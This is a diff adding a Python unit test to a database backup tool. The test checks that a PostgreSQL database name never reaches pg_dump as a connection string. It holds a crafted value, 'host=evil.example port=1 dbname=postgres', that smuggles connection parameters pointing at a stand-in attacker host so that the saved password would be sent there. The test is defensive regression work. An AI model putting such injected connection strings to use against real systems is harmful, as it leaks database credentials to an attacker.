@@ -8,6 +8,7 @@ import stat
 import sys
 import tempfile
 import threading
+import types
 import time
 import unittest
 from unittest import mock
@@ -63,6 +64,33 @@ class ToolTest(unittest.TestCase):
             job.run(["sleep", "20"])
         self.assertEqual(e.exception.code, "cancelled")
         self.assertLess(time.monotonic() - start, 5)
+
+    def test_pg_database_name_is_never_a_connection_string(self):
+        # A database name comes from whoever created it; as `-d` libpq would read this one as a
+        # connection string and send the saved password to evil.example.
+        crafted = "host=evil.example port=1 dbname=postgres"
+        tool = self.fake("postgresql", "17.2.1", "pg_dump")
+        record = os.path.join(self.tmp.name, "record")
+        with open(tool, "w") as f:
+            f.write('#!/bin/sh\nprintf "%s\\n" "$@" > "$REC.args"\nenv | grep ^PG > "$REC.env"\n'
+                    'while [ $# -gt 0 ]; do [ "$1" = -f ] && : > "$2"; shift; done\n')
+        adapter = types.SimpleNamespace(engine="postgresql", database="app", version=lambda: "PostgreSQL 17.2",
+                                        conn={"engine": "postgresql", "host": "db.local", "port": 5433,
+                                              "user": "u", "password": "pw"})
+        with mock.patch.object(dump, "find_tool", return_value=tool), \
+                mock.patch.dict(os.environ, {"REC": record, "PGHOSTADDR": "10.9.9.9", "PGSERVICE": "x"}):
+            dump.backup(adapter, dump.Job(), os.path.join(self.tmp.name, "out.sql"), database=crafted)
+        with open(record + ".args") as f:
+            args = f.read().splitlines()
+        with open(record + ".env") as f:
+            env = dict(line.split("=", 1) for line in f.read().splitlines())
+        self.assertNotIn(crafted, args)
+        for flag in ("-d", "-h", "-U", "-p", "--dbname", "--host"):
+            self.assertNotIn(flag, args)
+        self.assertEqual(env["PGDATABASE"], crafted)
+        self.assertEqual((env["PGHOST"], env["PGPORT"], env["PGUSER"]), ("db.local", "5433", "u"))
+        self.assertNotIn("PGHOSTADDR", env)   # an inherited one would win over PGHOST
+        self.assertNotIn("PGSERVICE", env)
 
     def test_sqlite_backup(self):
         src = os.path.join(self.tmp.name, "a.db")
